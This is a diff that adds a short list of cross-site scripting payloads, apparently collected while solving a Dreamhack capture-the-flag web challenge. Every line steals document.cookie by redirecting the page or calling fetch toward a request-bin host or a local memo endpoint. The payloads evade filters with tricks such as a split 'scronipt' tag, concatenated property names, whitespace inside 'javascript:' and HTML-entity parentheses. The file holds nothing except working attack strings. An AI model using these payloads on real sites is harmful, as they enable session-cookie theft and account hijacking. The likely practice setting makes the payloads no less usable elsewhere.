@@ -1,0 +1,11 @@
+<scronipt>document['locatio'+'n'].href="http://gthtjrn.request.dreamhack.games/?memo=" + document.cookie;</scronipt> 
+
+<scronipt>document['locatio'+'n'].href = "http://gthtjrn.request.dreamhack.games/?memo=" + document.cookie;</scronipt>
+
+<iframe srcdoc="<script></script>"></iframe>
+
+<iframe src="javascrip  t:documen   t.locatio   n.href='127.0.0.1/memo?memo='+documen   t.cookie"></iframe>
+
+<iframe src="javascrip	t:fetch 'http://127.0.0.1:8000/memo?memo='+docum	ent.cookie;"></iframe>
+
+<iframe src="javascrip	t:fetch&lpar;'http://127.0.0.1:8000/memo?memo='+docum	ent.cookie&rpar;"></iframe>
